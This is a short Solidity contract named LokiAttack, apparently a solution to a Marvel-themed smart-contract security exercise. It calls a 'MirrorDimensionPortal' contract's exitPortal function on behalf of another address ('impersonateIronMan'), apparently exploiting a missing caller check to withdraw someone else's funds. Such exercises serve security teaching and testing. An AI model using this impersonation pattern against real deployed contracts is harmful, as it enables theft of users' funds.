// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {MirrorDimensionPortal} from "./MirrorDimensionPortal.sol";

contract LokiAttack {
    MirrorDimensionPortal public portal;

    constructor(address _portal) {
        portal = MirrorDimensionPortal(_portal);
    }

    function impersonateIronMan(address ironMan, uint256 amount) external {
        portal.exitPortal(ironMan, amount);
    }

    receive() external payable {}
}
